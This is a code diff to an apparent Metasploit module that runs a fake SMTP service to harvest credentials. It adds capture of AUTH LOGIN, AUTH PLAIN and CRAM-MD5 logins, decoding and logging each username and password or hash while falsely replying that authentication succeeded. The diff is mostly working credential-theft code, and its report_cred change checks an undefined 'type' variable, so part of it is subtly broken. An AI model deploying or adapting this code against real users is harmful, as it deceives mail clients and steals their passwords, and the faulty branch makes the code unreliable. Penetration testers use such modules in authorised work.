@@ -15,7 +15,7 @@ class MetasploitModule < Msf::Auxiliary
         This module provides a fake SMTP service that
       is designed to capture authentication credentials.
       },
-      'Author'      => ['ddz', 'hdm'],
+      'Author'      => ['ddz', 'hdm', 'h00die'],
       'License'     => MSF_LICENSE,
       'Actions'     =>
         [
@@ -25,7 +25,11 @@ class MetasploitModule < Msf::Auxiliary
         [
           'Capture'
         ],
-      'DefaultAction'  => 'Capture'
+      'DefaultAction'  => 'Capture',
+      'References' =>
+        [
+          ['URL', 'https://www.samlogic.net/articles/smtp-commands-reference-auth.htm']
+        ],
     )
 
     register_options(
@@ -41,6 +45,11 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     exploit()
+  end
+
+  def auth_plain_parser(data)
+    # this data is \00 delimited, and has 3 fields: un\00un\00\pass.  Not sure why a double username, but we drop the first one
+    Rex::Text.decode_base64(data).split("\00").drop(1)
   end
 
   def on_client_connect(c)
@@ -75,6 +84,69 @@ class MetasploitModule < Msf::Auxiliary
         c.put "250 OK\r\n"
       end
 
+      return
+    end
+
+    if(@state[c][:auth_login])
+      if @state[c][:user].nil?
+        @state[c][:user] = Rex::Text.decode_base64(data)
+        c.put "334 #{Rex::Text.encode_base64('Password')}\r\n"
+        return
+      end
+      @state[c][:pass] = Rex::Text.decode_base64(data)
+      print_good("SMTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
+      report_cred(
+        ip: @state[c][:ip],
+        port: datastore['SRVPORT'],
+        service_name: 'smtp',
+        user: @state[c][:user],
+        password: @state[c][:pass],
+        proof: data # will be base64 encoded, but its proof...
+      )
+      @state[c][:auth_login] = nil
+      c.put "235 2.7.0 Authentication successful\r\n"
+      return
+    end
+
+    if(@state[c][:auth_plain])
+      # this data is \00 delimited, and has 3 fields: un\00un\00\pass.  Not sure why a double username
+      un_pass = auth_plain_parser data
+
+      @state[c][:user] = un_pass.first
+      @state[c][:pass] = un_pass.last
+      print_good("SMTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
+      report_cred(
+        ip: @state[c][:ip],
+        port: datastore['SRVPORT'],
+        service_name: 'smtp',
+        user: @state[c][:user],
+        password: @state[c][:pass],
+        proof: data # will be base64 encoded, but its proof...
+      )
+      @state[c][:auth_plain] = nil
+      c.put "235 2.7.0 Authentication successful\r\n"
+      return
+    end
+
+    if(@state[c][:auth_cram])
+      #data is <username><space><digest aka hash>
+      decoded = Rex::Text.decode_base64(data).split(' ')
+      @state[c][:user] = decoded.first
+      # challenge # response
+      @state[c][:pass] = "#{@state[c][:auth_cram_challenge]}##{decoded.last}"
+      report_cred(
+        ip: @state[c][:ip],
+        port: datastore['SRVPORT'],
+        service_name: 'smtp',
+        user: @state[c][:user],
+        password: @state[c][:pass],
+        proof: data, # will be base64 encoded, but its proof...
+        type: 'cram'
+      )
+      c.put "235 2.7.0 Authentication successful\r\n"
+      print_good("SMTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
+      @state[c][:auth_cram_challenge] = nil
+      @state[c][:auth_cram] = nil
       return
     end
 
@@ -121,11 +193,50 @@ class MetasploitModule < Msf::Auxiliary
         proof: arg
       )
       print_good("SMTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
+      return
+
+    when 'AUTH'
+      if arg == 'LOGIN'
+        @state[c][:auth_login] = true
+        c.put "334 #{Rex::Text.encode_base64('Username')}\r\n"
+        return
+      elsif arg.split(' ').first == 'PLAIN'
+        if arg.include? ' ' # the creds are passed as well
+          un_pass = auth_plain_parser arg.split(' ').last
+
+          @state[c][:user] = un_pass.first
+          @state[c][:pass] = un_pass.last
+          print_good("SMTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
+          report_cred(
+            ip: @state[c][:ip],
+            port: datastore['SRVPORT'],
+            service_name: 'smtp',
+            user: @state[c][:user],
+            password: @state[c][:pass],
+            proof: data # will be base64 encoded, but its proof...
+          )
+          c.put "235 2.7.0 Authentication successful\r\n"
+          return
+        end
+        @state[c][:auth_plain] = true
+        c.put "334\r\n"
+        return
+      elsif arg == 'CRAM-MD5'
+        # create and send challenge
+        challenge = Rex::Text.encode_base64("<12345@#{datastore['SRVHOST']}>")
+        c.put "334 #{challenge}\r\n"
+        @state[c][:auth_cram] = true
+        @state[c][:auth_cram_challenge] = "<12345@#{datastore['SRVHOST']}>"
+        return
+      end
+      # some other auth we dont understand
+      vprint_error("Unknown authentication type string: #{arg}")
+      c.put "503 Server Error\r\n"
+    else
+      vprint_error("Unknown command: #{arg}")
     end
-
     c.put "503 Server Error\r\n"
-    return
-
+  
   end
 
   def report_cred(opts)
@@ -136,14 +247,24 @@ class MetasploitModule < Msf::Auxiliary
       protocol: 'tcp',
       workspace_id: myworkspace_id
     }
-
-    credential_data = {
-      origin_type: :service,
-      module_fullname: fullname,
-      username: opts[:user],
-      private_data: opts[:password],
-      private_type: :password
-    }.merge(service_data)
+    if type == 'cram'
+      credential_data = {
+        origin_type: :service,
+        module_fullname: fullname,
+        username: opts[:user],
+        private_data: opts[:password],
+        private_type: :nonreplayable_hash,
+        jtr_format: 'hmac-md5'
+      }.merge(service_data)
+    else
+      credential_data = {
+        origin_type: :service,
+        module_fullname: fullname,
+        username: opts[:user],
+        private_data: opts[:password],
+        private_type: :password
+      }.merge(service_data)
+    end
 
     login_data = {
       core: create_credential(credential_data),
